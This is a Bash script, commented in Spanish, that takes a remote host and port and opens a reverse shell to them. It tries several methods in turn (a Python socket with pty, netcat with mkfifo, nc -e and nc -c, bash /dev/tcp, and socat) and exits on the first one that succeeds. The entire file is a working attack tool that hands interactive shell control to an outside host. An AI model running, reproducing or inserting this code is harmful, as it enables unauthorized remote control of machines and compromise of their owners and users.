#!/usr/bin/bash

# Verificar que se ha pasado el RHOST y RPORT
if [[ -z "$1" || -z "$2" ]]; then
    echo "Uso: $0 <RHOST> <RPORT>"
    exit 1
fi

export RHOST="$1"
export RPORT="$2"

# Método de Python
which python >/dev/null
if [[ $? -eq 0 ]]; then
    echo "Intentando con Python..."
    # ... (tu código Python aquí)
    python -c '
import sys
import socket
import os
import pty
from time import sleep

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)  # Establece un timeout de 5 segundos
s.connect((os.getenv("RHOST"), int(os.getenv("RPORT"))))
s.settimeout(None)  # Remueve el timeout una vez que se ha establecido la conexión
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
pty.spawn("sh")
'
    if [[ $? -eq 0 ]]; then
        echo "Éxito con Python."
        exit 0
    fi
fi

# Método de nc con mkfifo
which nc >/dev/null
which mkfifo >/dev/null
if [[ $? -eq 0 ]]; then
    echo "Intentando con nc y mkfifo..."
    rm -f /tmp/f;mkfifo /tmp/f
    cat /tmp/f|sh -i 2>&1|nc $RHOST $RPORT >/tmp/f
    if [[ $? -eq 0 ]]; then
        echo "Éxito con nc y mkfifo."
        exit 0
    fi
    rm -f /tmp/f
fi

# Método de nc con -e
which nc >/dev/null
if [[ $? -eq 0 ]]; then
    echo "Intentando con nc -e..."
    nc $RHOST $RPORT -e /bin/bash
    if [[ $? -eq 0 ]]; then
        echo "Éxito con nc -e."
        exit 0
    fi
fi

# Método de nc con -c
which nc >/dev/null
if [[ $? -eq 0 ]]; then
    echo "Intentando con nc -c..."
    nc -c /bin/bash $RHOST $RPORT
    if [[ $? -eq 0 ]]; then
        echo "Éxito con nc -c."
        exit 0
    fi
fi

# Método de bash
which bash >/dev/null
if [[ $? -eq 0 ]]; then
    echo "Intentando con bash..."
    bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1
    if [[ $? -eq 0 ]]; then
        echo "Éxito con bash."
        exit 0
    fi
fi

# Método con socat
which socat >/dev/null
if [[ $? -eq 0 ]]; then
    echo "Intentando con socat..."
    socat TCP:$RHOST:$RPORT EXEC:'bash -li',pty,stderr,setsid,sigint,sane
    if [[ $? -eq 0 ]]; then
        echo "Éxito con socat."
        exit 0
    fi
fi

# Si llega aquí, todos los métodos han fallado
echo "Todos los métodos han fallado."
exit 1

